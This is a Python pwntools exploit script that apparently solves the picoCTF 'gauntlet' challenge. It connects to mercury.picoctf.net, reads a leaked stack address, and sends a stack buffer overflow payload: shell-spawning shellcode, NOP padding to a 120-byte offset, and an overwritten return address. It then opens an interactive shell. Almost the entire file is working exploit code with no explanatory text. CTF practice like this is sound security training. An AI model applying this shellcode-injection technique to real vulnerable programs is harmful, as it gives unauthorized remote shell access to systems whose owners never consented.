#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 32853 gauntlet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('gauntlet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 32853)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()
io.sendline("a")

# Calculate offset
offset = 120
if args.LOCAL and not offset:
    log.progress('Calculating offset...')
    payload = cyclic(1000, n=8)
    io.sendline(payload)
    # Wait for process to exit
    io.wait()
    core = io.corefile
    found_offset = cyclic_find(core.fault_addr, n=8)
    log.progress('Found offset: %s' % found_offset)
    offset = found_offset

io = start()
string_copied_into_location = int(io.recvline(), 16)
print("Location of shellcode: %x" % string_copied_into_location)
io.sendline("a")

shellcode = asm(shellcraft.sh())
payload = shellcode + b"\x90"*(offset-len(shellcode)) + p64(string_copied_into_location)
io.send(payload)

io.interactive()
